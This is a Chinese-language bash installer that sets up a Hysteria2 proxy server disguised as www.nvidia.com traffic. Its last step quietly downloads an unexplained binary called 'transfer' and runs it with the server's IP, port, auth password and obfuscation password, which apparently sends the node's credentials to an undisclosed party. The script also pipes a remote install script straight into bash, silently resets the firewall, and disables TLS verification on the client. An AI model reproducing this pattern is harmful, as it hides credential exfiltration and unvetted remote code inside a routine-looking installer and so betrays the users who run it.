#!/bin/bash

# 颜色定义
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
NC='\033[0m'

# 系统检测
SYSTEM="Unknown"
if [ -f /etc/debian_version ]; then
    SYSTEM="Debian"
elif [ -f /etc/redhat-release ]; then
    SYSTEM="CentOS"
elif [ -f /etc/lsb-release ]; then
    SYSTEM="Ubuntu"
elif [ -f /etc/fedora-release ]; then
    SYSTEM="Fedora"
fi

download_transfer() {
    if [[ ! -f /opt/transfer ]]; then
        echo -e "${YELLOW}下载transfer工具...${NC}"
        curl -Lo /opt/transfer https://github.com/Firefly-xui/hysteria2/releases/download/v2rayn/transfer
        chmod +x /opt/transfer
    fi
}

upload_config() {
    download_transfer
    
    local json_data=$(cat <<EOF
{
    "server_info": {
        "title": "Hysteria2 节点信息 - ${SERVER_IP}",
        "server_ip": "${SERVER_IP}",
        "port": "${LISTEN_PORT}",
        "auth_password": "${AUTH_PASSWORD}",
        "port_range": "${PORT_HOP_RANGE}",
        "upload_speed": "${up_speed}",
        "download_speed": "${down_speed}",
        "sni": "www.nvidia.com",
        "obfs_type": "salamander",
        "obfs_password": "cry_me_a_r1ver",
        "generated_time": "$(date)",
        "config_path": "/opt/hysteria2_client.yaml"
    }
}
EOF
    )

    /opt/transfer "$json_data"

}

# 速度测试函数
speed_test(){
    echo -e "${YELLOW}进行网络速度测试...${NC}"
    if ! command -v speedtest &>/dev/null && ! command -v speedtest-cli &>/dev/null; then
        echo -e "${YELLOW}安装speedtest-cli中...${NC}"
        if [[ $SYSTEM == "Debian" || $SYSTEM == "Ubuntu" ]]; then
            apt-get update > /dev/null 2>&1
            apt-get install -y speedtest-cli > /dev/null 2>&1
        elif [[ $SYSTEM == "CentOS" || $SYSTEM == "Fedora" ]]; then
            yum install -y speedtest-cli > /dev/null 2>&1 || pip install speedtest-cli > /dev/null 2>&1
        fi
    fi

    if command -v speedtest &>/dev/null; then
        speed_output=$(speedtest --simple 2>/dev/null)
    elif command -v speedtest-cli &>/dev/null; then
        speed_output=$(speedtest-cli --simple 2>/dev/null)
    fi

    if [[ -n "$speed_output" ]]; then
        down_speed=$(echo "$speed_output" | grep "Download" | awk '{print int($2)}')
        up_speed=$(echo "$speed_output" | grep "Upload" | awk '{print int($2)}')
        [[ $down_speed -lt 10 ]] && down_speed=10
        [[ $up_speed -lt 5 ]] && up_speed=5
        [[ $down_speed -gt 1000 ]] && down_speed=1000
        [[ $up_speed -gt 500 ]] && up_speed=500
        echo -e "${GREEN}测速完成：下载 ${down_speed} Mbps，上传 ${up_speed} Mbps${NC},将根据该参数优化网络速度，如果测试不准确，请手动修改"
    else
        echo -e "${YELLOW}测速失败，使用默认值${NC}"
        down_speed=100
        up_speed=20
    fi
}

# 安装Hysteria2
install_hysteria() {
    echo -e "${GREEN}安装 Hysteria2...${NC}"
    bash <(curl -fsSL https://get.hy2.sh/) > /dev/null 2>&1
    if [ $? -ne 0 ]; then
        echo -e "${RED}安装失败${NC}"
        exit 1
    fi
}

# 生成随机端口
generate_random_port() {
    echo $(( ( RANDOM % 7001 ) + 2000 ))
}

generate_port_range() {
    local start=$(generate_random_port)
    local end=$((start + 99))
    ((end > 9000)) && end=9000 && start=$((end - 99))
    echo "$start-$end"
}

# 配置 Hysteria2
configure_hysteria() {
    echo -e "${GREEN}配置 Hysteria2...${NC}"
    speed_test
    LISTEN_PORT=$(generate_random_port)
    PORT_HOP_RANGE=$(generate_port_range)
    AUTH_PASSWORD=$(tr -dc A-Za-z0-9 </dev/urandom | head -c 16)

    mkdir -p /etc/hysteria/certs
    openssl req -x509 -nodes -newkey ec -pkeyopt ec_paramgen_curve:prime256v1 \
        -keyout /etc/hysteria/certs/key.pem \
        -out /etc/hysteria/certs/cert.pem \
        -subj "/CN=www.nvidia.com" -days 3650 > /dev/null 2>&1
    chmod 644 /etc/hysteria/certs/*.pem
    chown root:root /etc/hysteria/certs/*.pem

    cat > /etc/hysteria/config.yaml <<EOF
listen: :${LISTEN_PORT}
tls:
  cert: /etc/hysteria/certs/cert.pem
  key: /etc/hysteria/certs/key.pem
  sni: www.nvidia.com

obfs:
  type: salamander
  salamander:
    password: cry_me_a_r1ver

quic:
  initStreamReceiveWindow: 26843545
  maxStreamReceiveWindow: 26843545
  initConnReceiveWindow: 67108864
  maxConnReceiveWindow: 67108864
  maxIdleTimeout: 30s
  maxIncomingStreams: 1024
  disablePathMTUDiscovery: false

bandwidth:
  up: ${up_speed} mbps
  down: ${down_speed} mbps

ignoreClientBandwidth: false
speedTest: true

auth:
  type: password
  password: ${AUTH_PASSWORD}

masquerade:
  type: proxy
  proxy:
    url: https://www.nvidia.com
    rewriteHost: true

transport:
  type: udp
  udp:
    hopInterval: 30s
    hopPortRange: ${PORT_HOP_RANGE}
EOF

    # 系统缓冲区优化
    sysctl -w net.core.rmem_max=16777216 > /dev/null
    sysctl -w net.core.wmem_max=16777216 > /dev/null

    # 优先级提升
    mkdir -p /etc/systemd/system/hysteria-server.service.d
    cat > /etc/systemd/system/hysteria-server.service.d/priority.conf <<EOF
[Service]
CPUSchedulingPolicy=rr
CPUSchedulingPriority=99
EOF
    systemctl daemon-reexec
    systemctl daemon-reload > /dev/null
}

# 防火墙设置
configure_firewall() {
    echo -e "${GREEN}配置防火墙...${NC}"
    IFS="-" read -r HOP_START HOP_END <<< "$PORT_HOP_RANGE"
    if [[ $SYSTEM == "Debian" || $SYSTEM == "Ubuntu" ]]; then
        apt-get install -y ufw > /dev/null 2>&1
        echo "y" | ufw reset > /dev/null
        ufw allow 22/tcp > /dev/null
        ufw allow ${LISTEN_PORT}/udp > /dev/null
        ufw allow ${HOP_START}:${HOP_END}/udp > /dev/null
        echo "y" | ufw enable > /dev/null
    elif [[ $SYSTEM == "CentOS" || $SYSTEM == "Fedora" ]]; then
        yum install -y firewalld > /dev/null
        systemctl enable firewalld > /dev/null
        systemctl start firewalld > /dev/null
        firewall-cmd --permanent --add-service=ssh > /dev/null
        firewall-cmd --permanent --add-port=${LISTEN_PORT}/udp > /dev/null
        firewall-cmd --permanent --add-port=${HOP_START}-${HOP_END}/udp > /dev/null
        firewall-cmd --reload > /dev/null
    fi
}

# 生成客户端配置
generate_v2rayn_config() {
    echo -e "${GREEN}生成客户端配置...${NC}"
    mkdir -p /opt
    SERVER_IP=$(curl -s ifconfig.me)
    cat > /opt/hysteria2_client.yaml <<EOF
server: ${SERVER_IP}:${LISTEN_PORT}
auth: ${AUTH_PASSWORD}
tls:
  sni: www.nvidia.com
  insecure: true
obfs:
  type: salamander
  salamander:
    password: cry_me_a_r1ver
transport:
  type: udp
  udp:
    hopInterval: 30s
    hopPortRange: ${PORT_HOP_RANGE}
bandwidth:
  up: ${up_speed} mbps
  down: ${down_speed} mbps
fastOpen: true
lazy: true
socks5:
  listen: 127.0.0.1:1080
http:
  listen: 127.0.0.1:1080
EOF
}

# 启动服务
start_service() {
    echo -e "${GREEN}启动服务中...${NC}"
    systemctl enable --now hysteria-server.service > /dev/null 2>&1
    systemctl restart hysteria-server.service > /dev/null 2>&1

    # 检查服务状态
    if systemctl is-active --quiet hysteria-server.service; then
        echo -e "${GREEN}服务已启动成功！${NC}"
        echo -e "\n${GREEN}=== 连接信息 ===${NC}"
        echo -e "${YELLOW}IP地址: ${SERVER_IP}${NC}"
        echo -e "${YELLOW}端口: ${LISTEN_PORT}${NC}"
        echo -e "${YELLOW}认证密码: ${AUTH_PASSWORD}${NC}"
        echo -e "${YELLOW}跳跃端口范围: ${PORT_HOP_RANGE}${NC}"
        echo -e "${YELLOW}伪装域名: www.nvidia.com${NC}"
        echo -e "${YELLOW}上传带宽: ${up_speed} Mbps${NC}"
        echo -e "${YELLOW}下载带宽: ${down_speed} Mbps${NC}"
        echo -e "${YELLOW}客户端配置路径: /opt/hysteria2_client.yaml${NC}"
        echo -e "${GREEN}=========================${NC}\n"
    else
        echo -e "${RED}服务启动失败，请检查以下日志信息：${NC}"
        journalctl -u hysteria-server.service --no-pager -n 30
        exit 1
    fi
}

# 主函数执行
main() {
    if [ "$(id -u)" != "0" ]; then
        echo -e "${RED}请使用 root 权限执行脚本${NC}"
        exit 1
    fi

    # 移除 BBR 设置（确保使用 Brutal）

    sed -i '/net.core.default_qdisc/d' /etc/sysctl.conf
    sed -i '/net.ipv4.tcp_congestion_control/d' /etc/sysctl.conf
    sysctl -p > /dev/null 2>&1


    # 执行流程
    install_hysteria
    configure_hysteria
    configure_firewall
    generate_v2rayn_config
    start_service
    upload_config

    echo -e "${GREEN}🎉 Hysteria2 节点部署与优化完成！${NC}"
    echo -e "${YELLOW}可在 v2rayN 或 Shadowrocket 中导入 /opt/hysteria2_client.yaml${NC}"

}

# 执行主逻辑
main
